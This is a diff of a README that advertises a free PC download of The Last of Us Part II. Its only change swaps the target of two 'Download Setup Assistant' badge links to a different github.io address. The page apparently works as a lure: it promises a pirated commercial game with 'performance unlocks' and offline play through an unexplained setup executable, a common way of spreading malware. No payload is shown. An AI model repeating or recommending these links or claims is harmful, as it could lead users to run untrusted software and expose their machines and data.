@@ -1,6 +1,6 @@
 # The Last of Us Part II — PC Free Download 
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://the-last-of-us-2-pc-donwload.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/TLOU2)
 
 ## ⚙️ How to Use
 
@@ -41,7 +41,7 @@
 
 Using the Setup Assistant, you can fully download and launch the game — including all enhancements, cutscenes, and performance unlocks — on any Windows PC. Designed for users who want a clean, standalone experience, the process supports local saves and offline play without Steam or other platforms. Enjoy enhanced visuals, richer textures, and seamless gameplay without needing an online connection.
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://the-last-of-us-2-pc-donwload.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/TLOU2)
 
 ---
 
